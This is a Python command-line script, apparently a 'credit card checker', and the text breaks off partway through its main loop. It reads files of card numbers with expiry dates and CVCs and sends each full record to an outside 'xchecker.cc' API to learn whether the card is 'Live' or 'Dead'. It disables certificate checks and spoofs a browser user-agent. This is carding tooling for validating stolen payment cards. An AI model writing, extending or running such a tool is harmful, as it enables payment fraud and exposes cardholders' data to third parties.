import os
import requests
import time
import urllib3
import logging
import argparse
import re
from datetime import datetime
from termcolor import colored
import colorama
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(filename='nullchecker.log', level=logging.ERROR)

parser = argparse.ArgumentParser(description='Check the validity of credit card numbers.')
parser.add_argument('input_file', metavar='input_file', type=str, help='The name of the input file')
parser.add_argument('output_file', metavar='output_file', type=str, help='The name of the output file')
args = parser.parse_args()

cc_file = args.input_file
output_file = args.output_file

checker_api_url = "https://www.xchecker.cc/api.php?cc={}|{}|{}|{}"
headers = { 
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Accept": "*/*",
}

def write_file_output(data, file, mode="a"):
    with open(file, mode) as f:
        f.write("{}\n".format(data))
    if "|Live|" in data:
        print(colored(data, "green", attrs=["bold"]))
    elif "|Dead|" in data:
        print(colored(data, "red", attrs=["bold"]))
    else:
        print(colored(data, "yellow", attrs=["bold"]))

def validate_cc_number(cc_number):
    pattern = re.compile(r'^\d{16}$')
    if pattern.match(cc_number):
        return True
    else:
        return False

def main():
    if os.path.exists(cc_file):
        with open(cc_file) as f:
            write_file_output("Output file results: {}".format(output_file), output_file)
            for cc in f:
                cc = cc.replace("\r", "").replace("\n", "")
                try:
                    cc_number, exp_month, exp_year, cvc = cc.split("|")
                    if not validate_cc_number(cc_number):
                        raise ValueError("Invalid credit card number format")
                except (ValueError, TypeError) as e:
                    logging.error(f"Format error for {cc}: {str(e)}")
                    write_file_output(f"{cc} => Format error. Use ccNumber|expMonth|expYear|cvc", output_file)
                    continue
                url = checker_api_url.format(cc_number, exp_month, exp_year, cvc)
                while True:
                    response = requests.get(url, headers=headers, verify=False, allow_redirects=False)
                    if response.status_code == 200 and "json" in response.headers["Content-Type"]:
                        data = response.json()
                        if "ccNumber" in data:
                            output = data["ccNumber"]
                            if "cvc" in data:
                               
